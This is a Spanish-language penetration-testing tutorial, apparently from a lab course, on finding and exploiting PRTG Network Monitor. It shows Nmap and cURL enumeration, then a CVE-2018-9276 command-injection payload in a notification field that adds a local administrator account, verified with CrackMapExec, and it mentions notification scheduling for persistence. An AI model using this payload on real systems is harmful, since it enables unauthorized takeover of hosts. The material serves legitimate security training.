[PRTG Network Monitor](https://www.paessler.com/prtg) es un software de monitorización de red sin agentes. Puede usarse para monitorear el uso de ancho de banda, tiempo de actividad y recopilar estadísticas de varios hosts, incluidos routers, switches, servers y más. La primera versión de PRTG se lanzó en 2003. En 2015 se lanzó una versión gratuita de PRTG, limitada a 100 sensores que se pueden usar para monitorear hasta 20 hosts. Funciona con un modo de descubrimiento automático para escanear áreas de una red y crear una lista de dispositivos. Una vez creada esta lista, puede recopilar más información de los dispositivos detectados utilizando protocolos como ICMP, SNMP, WMI, NetFlow, y más. Los dispositivos también pueden comunicarse con la herramienta a través de una REST API. El software se ejecuta completamente desde un sitio web basado en AJAX, pero hay una aplicación de escritorio disponible para Windows, Linux y macOS. Algunos puntos de datos interesantes sobre PRTG:

- Según la compañía, es utilizado por 300,000 usuarios en todo el mundo.
- La empresa que fabrica la herramienta, Paessler, ha estado creando soluciones de monitorización desde 1997.
- Algunas organizaciones que utilizan PRTG para monitorear sus redes incluyen el Aeropuerto Internacional de Nápoles, Virginia Tech, 7-Eleven, y [más](https://www.paessler.com/company/casestudies).

A lo largo de los años, PRTG ha sufrido [26 vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) a las que se les asignaron CVEs. De todas estas, solo cuatro tienen PoCs de exploit público fáciles de encontrar: dos cross-site scripting (XSS), una Denial of Service y una vulnerabilidad de authenticated command injection que cubriremos en esta sección. Es raro ver PRTG expuesto externamente, pero a menudo nos encontramos con PRTG durante pruebas de penetración internas. La caja semanal de HTB [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) muestra PRTG.

---

## Discovery/Footprinting/Enumeration

Podemos descubrir rápidamente PRTG con un escaneo de Nmap. Normalmente se puede encontrar en puertos web comunes como 80, 443 o 8080. Es posible cambiar el puerto de la interfaz web en la sección Setup al iniciar sesión como admin.

```r
sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

Del escaneo de Nmap anterior, podemos ver el servicio `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detectado en el puerto 8080.

PRTG también aparece en el escaneo de EyeWitness que realizamos anteriormente. Aquí podemos ver que EyeWitness enumera las credenciales predeterminadas `prtgadmin:prtgadmin`. Por lo general, están pre-llenadas en la página de inicio de sesión y a menudo las encontramos sin cambios. Los escáneres de vulnerabilidades como Nessus también tienen [plugins](https://www.tenable.com/plugins/nessus/51874) que detectan la presencia de PRTG.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Una vez que hemos descubierto PRTG, podemos confirmar navegando a la URL y ser presentados con la página de inicio de sesión.

![](https://academy.hackthebox.com/storage/modules/113/prtg_login.png)

De la enumeración que hemos realizado hasta ahora, parece ser la versión de PRTG `17.3.33.2830` y probablemente sea vulnerable a [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276), que es una inyección de comandos autenticada en la consola web del Administrador del Sistema de PRTG Network Monitor antes de la versión 18.2.39. Basado en la versión reportada por Nmap, podemos asumir que estamos tratando con una versión vulnerable. Usando `cURL`, podemos ver que el número de versión es efectivamente `17.3.33.2830`.

```r
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

Nuestro primer intento de iniciar sesión con las credenciales predeterminadas falla, pero unos intentos más tarde, estamos dentro con `prtgadmin:Password123`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png)

---

## Leveraging Known Vulnerabilities

Una vez dentro, podemos explorar un poco, pero sabemos que probablemente sea vulnerable a una falla de inyección de comandos, así que vamos directo al grano. Este excelente [blog post](https://www.codewatch.org/blog/?p=453) del individuo que descubrió esta falla hace un gran trabajo explicando el proceso de descubrimiento inicial y cómo lo descubrieron. Al crear una nueva notificación, el campo `Parameter` se pasa directamente a un script de PowerShell sin ningún tipo de sanitización de entrada.

Para comenzar, pasa el ratón sobre `Setup` en la parte superior derecha y luego el menú `Account Settings` y finalmente haz clic en `Notifications`.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png)

Luego, haz clic en `Add new notification`.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Dale un nombre a la notificación y desplázate hacia abajo y marca la casilla junto a `EXECUTE PROGRAM`. Bajo `Program File`, selecciona `Demo exe notification - outfile.ps1` del menú desplegable. Finalmente, en el campo de parámetro, ingresa un comando. Para nuestros propósitos, agregaremos un nuevo usuario admin local ingresando `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. Durante una evaluación real, es

 posible que queramos hacer algo que no cambie el sistema, como obtener una reverse shell o conexión a nuestro C2 favorito. Finalmente, haz clic en el botón `Save`.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

Después de hacer clic en `Save`, seremos redirigidos a la página de `Notifications` y veremos nuestra nueva notificación llamada `pwn` en la lista.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

Ahora, podríamos haber programado la notificación para que se ejecute (y ejecute nuestro comando) en un momento posterior al configurarlo. Esto podría ser útil como mecanismo de persistencia durante un engagement a largo plazo y vale la pena tenerlo en cuenta. Los horarios pueden modificarse en el menú de configuración de la cuenta si queremos configurarlo para que se ejecute en un momento específico todos los días para recuperar nuestra conexión o algo por el estilo. En este punto, todo lo que queda es hacer clic en el botón `Test` para ejecutar nuestra notificación y ejecutar el comando para agregar un usuario admin local. Después de hacer clic en `Test`, obtendremos una ventana emergente que dice `EXE notification is queued up`. Si recibimos algún tipo de mensaje de error aquí, podemos volver y verificar la configuración de la notificación.

Como esto es una ejecución de comando ciego, no obtendremos ningún feedback, por lo que tendríamos que verificar si nuestro listener recibe una conexión de vuelta o, en nuestro caso, verificar si podemos autenticarnos en el host como admin local. Podemos usar `CrackMapExec` para confirmar el acceso de admin local. También podríamos intentar hacer RDP a la caja, acceder a través de WinRM, o usar una herramienta como [evil-winrm](https://github.com/Hackplayers/evil-winrm) o algo del toolkit de [impacket](https://github.com/SecureAuthCorp/impacket) como `wmiexec.py` o `psexec.py`.

```r
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

Y confirmamos el acceso de admin local en el objetivo. Trabaja a través del ejemplo y replica todos los pasos por tu cuenta contra el sistema objetivo. Desafíate a ti mismo también a aprovechar la vulnerabilidad de inyección de comandos para obtener una conexión de reverse shell desde el objetivo.

---

## Onwards

Ahora que hemos cubierto Splunk y PRTG, vamos a avanzar y discutir algunas herramientas comunes de gestión de servicio al cliente y gestión de configuración y ver cómo podemos abusar de ellas durante nuestros engagements.